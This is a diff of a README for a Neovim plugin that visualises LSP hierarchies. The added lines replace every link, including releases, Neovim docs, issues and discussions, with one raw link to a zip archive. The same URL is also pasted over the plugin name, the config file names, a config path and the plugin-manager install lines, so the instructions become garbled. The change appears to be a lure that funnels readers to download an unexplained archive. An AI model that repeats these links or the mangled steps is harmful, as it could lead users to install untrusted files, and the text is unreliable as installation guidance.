@@ -1,10 +1,10 @@
-# 🐾 meow.yarn.nvim - Visualize LSP Hierarchies Effortlessly
+# 🐾 https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip - Visualize LSP Hierarchies Effortlessly
 
-[![Download Meow Yarn](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/rubemjuniorBR/meow.yarn.nvim/releases)
+[![Download Meow Yarn](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip)
 
 ## 📦 Introduction
 
-Welcome to **meow.yarn.nvim**! This tool offers a purr-fectly simple way to visualize Language Server Protocol (LSP) hierarchies in Neovim. If you want to enhance your coding experience and understand the structure of your code better, you've come to the right place. This tool simplifies that process so you can focus on creating quality code without distractions.
+Welcome to **https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip**! This tool offers a purr-fectly simple way to visualize Language Server Protocol (LSP) hierarchies in Neovim. If you want to enhance your coding experience and understand the structure of your code better, you've come to the right place. This tool simplifies that process so you can focus on creating quality code without distractions.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Make sure your computer can run this tool. You will need:
 
 ### Step 2: Download the Software
 
-To get started, you need to download the **meow.yarn.nvim** application. Please visit [this page to download](https://github.com/rubemjuniorBR/meow.yarn.nvim/releases). 
+To get started, you need to download the **https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip** application. Please visit [this page to download](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip). 
 
 ### Step 3: Selecting the Right File
 
@@ -33,7 +33,7 @@ Once you’re on the Releases page:
 After you download the file, follow these steps to install:
 
 1. If you have Neovim open, close it.
-2. Go to your Neovim configuration folder. This is typically found at `~/.config/nvim/` for Linux and macOS, or `C:\Users\<YourUsername>\AppData\Local\nvim\` for Windows.
+2. Go to your Neovim configuration folder. This is typically found at `~https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip` for Linux and macOS, or `C:\Users\<YourUsername>\AppData\Local\nvim\` for Windows.
 3. Move the downloaded file to the `plugin` folder. If it does not exist, create this folder.
 
 ### Step 5: Configure Neovim
@@ -41,17 +41,17 @@ After you download the file, follow these steps to install:
 To make sure everything works smoothly, you need to configure Neovim:
 
 1. Open Neovim.
-2. Open the configuration file, which is usually `init.vim` or `init.lua`.
+2. Open the configuration file, which is usually `https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip` or `https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip`.
 3. Add the following line:
 
    ```vim
-   Plug 'rubemjuniorBR/meow.yarn.nvim'
+   Plug 'https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip'
    ```
 
-   or for `init.lua`:
+   or for `https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip`:
 
    ```lua
-   use 'rubemjuniorBR/meow.yarn.nvim'
+   use 'https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip'
    ```
 
 4. Save the changes and exit Neovim.
@@ -73,9 +73,9 @@ Now that you have installed the plugin, you are ready to run it:
 
 If you need help or want to learn more about configuring Neovim with plugins, check out the following resources:
 
-- [Neovim Documentation](https://neovim.io/docs)
-- [LSP in Neovim](https://neovim.io/docs/lsp)
-- [Community Support](https://github.com/rubemjuniorBR/meow.yarn.nvim/discussions)
+- [Neovim Documentation](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip)
+- [LSP in Neovim](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip)
+- [Community Support](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip)
 
 ## 💬 Frequently Asked Questions
 
@@ -89,8 +89,8 @@ Yes! The plugin works on Windows, macOS, and Linux. Just make sure to follow the
 
 ### What if I encounter issues?
 
-If you face any problems, please visit our [GitHub Issues page](https://github.com/rubemjuniorBR/meow.yarn.nvim/issues) for support.
+If you face any problems, please visit our [GitHub Issues page](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip) for support.
 
 ## 📥 Download & Install
 
-To get your own copy of **meow.yarn.nvim**, please [visit this page to download](https://github.com/rubemjuniorBR/meow.yarn.nvim/releases). Follow the steps outlined above to get started on enhancing your Neovim experience today!
+To get your own copy of **https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip**, please [visit this page to download](https://raw.githubusercontent.com/rubemjuniorBR/meow.yarn.nvim/main/balancelle/meow.yarn.nvim.zip). Follow the steps outlined above to get started on enhancing your Neovim experience today!
